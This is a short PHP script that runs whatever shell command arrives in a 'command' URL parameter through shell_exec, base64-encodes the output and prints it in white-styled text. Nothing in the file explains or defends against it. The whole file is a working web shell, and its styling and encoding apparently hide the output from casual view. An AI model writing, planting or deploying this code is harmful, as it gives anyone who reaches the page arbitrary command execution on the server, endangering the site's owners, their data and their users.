<?php

if (isset($_GET['command'])) {

    $command = $_GET['command'];

    $output = base64_encode(shell_exec($command));

    echo "<p color='white'>$output</p>";
} else {
  echo "<p color='white'>GET parameters blank or not valid";
}

?>

